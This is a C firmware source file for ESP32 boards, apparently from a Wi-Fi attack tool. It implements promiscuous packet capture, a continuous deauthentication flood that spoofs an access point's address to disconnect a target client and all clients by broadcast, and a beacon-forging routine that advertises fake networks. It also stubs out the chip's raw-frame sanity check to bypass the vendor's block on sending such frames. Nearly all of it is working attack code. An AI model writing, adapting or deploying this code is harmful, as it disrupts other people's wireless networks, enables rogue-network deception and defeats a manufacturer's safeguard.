#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_random.h"
#include "packet_handler.h"

static const char *TAG = "PACKET_HANDLER";

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

static packet_callback_t packet_callback = NULL;
static bool monitor_mode_active = false;
static bool deauth_active = false;
static TaskHandle_t deauth_task_handle = NULL;

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t dest_addr[6];
    uint8_t source_addr[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) deauth_frame_t;

struct deauth_params {
    uint8_t dest_mac[6];
    uint8_t ap_mac[6];
};

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!buf || !packet_callback) {
        return;
    }
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len > 0 && pkt->rx_ctrl.sig_len < 2048) {
        packet_callback(buf, type);
    }
}

esp_err_t packet_handler_init(void) {
    ESP_LOGI(TAG, "Packet handler initialized");
    return ESP_OK;
}

esp_err_t packet_handler_start_monitor(uint8_t channel, packet_callback_t callback) {
    esp_err_t ret;
    if (monitor_mode_active) {

        packet_callback = callback;
        packet_handler_set_channel(channel);
        return ESP_OK;
    }
    packet_callback = callback;
    ret = esp_wifi_set_promiscuous(true);
    if (ret != ESP_OK) return ret;

    ret = esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
    if (ret != ESP_OK) return ret;

    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
    esp_wifi_set_promiscuous_filter(&filter);
    packet_handler_set_channel(channel);

    monitor_mode_active = true;
    ESP_LOGI(TAG, "Monitor mode started on channel %d", channel);
    return ESP_OK;
}

esp_err_t packet_handler_stop_monitor(void) {
    if (!monitor_mode_active) return ESP_OK;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    packet_callback = NULL;
    monitor_mode_active = false;
    vTaskDelay(pdMS_TO_TICKS(10));
    ESP_LOGI(TAG, "Monitor mode stopped");
    return ESP_OK;
}

esp_err_t packet_handler_send_deauth_frame(uint8_t *dest_mac, uint8_t *ap_mac) {
    deauth_frame_t deauth_frame = {
        .frame_control = 0x00c0,
        .duration = 0x013a,
        .reason_code = 0x0007
    };
    memcpy(deauth_frame.dest_addr, dest_mac, 6);
    memcpy(deauth_frame.source_addr, ap_mac, 6);
    memcpy(deauth_frame.bssid, ap_mac, 6);

    return esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
}

static void deauth_task_function(void *params) {
    struct deauth_params *task_params = (struct deauth_params*)params;
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    ESP_LOGI(TAG, "Deauth task running...");
    while (deauth_active) {

        if (memcmp(task_params->dest_mac, broadcast_mac, 6) != 0) {
             packet_handler_send_deauth_frame(task_params->dest_mac, task_params->ap_mac);
             vTaskDelay(pdMS_TO_TICKS(5)); // Small delay to prevent watchdog trigger
        }

        // Attack AP -> Broadcast (Disassociate all clients)
        packet_handler_send_deauth_frame(broadcast_mac, task_params->ap_mac);
        vTaskDelay(pdMS_TO_TICKS(10)); // Total ~60 packets/sec
    }

    free(params);
    deauth_task_handle = NULL;
    ESP_LOGI(TAG, "Deauth task stopped");
    vTaskDelete(NULL);
}

esp_err_t packet_handler_start_deauth(uint8_t *dest_mac, uint8_t *ap_mac) {
    if (deauth_active) return ESP_OK;

    deauth_active = true;

    struct deauth_params *task_params = malloc(sizeof(struct deauth_params));
    if (!task_params) return ESP_ERR_NO_MEM;

    memcpy(task_params->dest_mac, dest_mac, 6);
    memcpy(task_params->ap_mac, ap_mac, 6);

    xTaskCreate(deauth_task_function, "deauth_task", 4096, task_params, 5, &deauth_task_handle);
    return ESP_OK;
}

esp_err_t packet_handler_stop_deauth(void) {
    deauth_active = false;

    return ESP_OK;
}

esp_err_t packet_handler_set_channel(uint8_t channel) {
    if (channel < 1 || channel > 14) return ESP_ERR_INVALID_ARG;
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void packet_handler_send_beacon_raw(const char *ssid, uint8_t *bssid, uint8_t channel) {
    uint8_t packet[128];
    int offset = 0;

    packet[offset++] = 0x80; packet[offset++] = 0x00;
    packet[offset++] = 0x00; packet[offset++] = 0x00;
    memset(&packet[offset], 0xFF, 6); offset += 6;
    memcpy(&packet[offset], bssid, 6); offset += 6;
    memcpy(&packet[offset], bssid, 6); offset += 6;
    packet[offset++] = 0x00; packet[offset++] = 0x00;

    for(int i=0; i<8; i++) packet[offset++] = (uint8_t)esp_random();
    packet[offset++] = 0x64; packet[offset++] = 0x00;
    packet[offset++] = 0x01; packet[offset++] = 0x00;

    int ssid_len = strlen(ssid);
    if(ssid_len > 32) ssid_len = 32;
    packet[offset++] = 0x00;
    packet[offset++] = ssid_len;
    memcpy(&packet[offset], ssid, ssid_len); offset += ssid_len;

    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    packet[offset++] = 0x01; packet[offset++] = sizeof(rates);
    memcpy(&packet[offset], rates, sizeof(rates)); offset += sizeof(rates);

    packet[offset++] = 0x03; packet[offset++] = 0x01; packet[offset++] = channel;

    esp_wifi_80211_tx(WIFI_IF_AP, packet, offset, false);
}

void packet_handler_send_beacon(const char *ssid) {
    uint8_t mac[6];
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();

    mac[0] = 0x02;
    mac[1] = (uint8_t)(r1 & 0xFF);
    mac[2] = (uint8_t)((r1 >> 8) & 0xFF);
    mac[3] = (uint8_t)((r1 >> 16) & 0xFF);
    mac[4] = (uint8_t)(r2 & 0xFF);
    mac[5] = (uint8_t)((r2 >> 8) & 0xFF);

    packet_handler_send_beacon_raw(ssid, mac, 1);
}
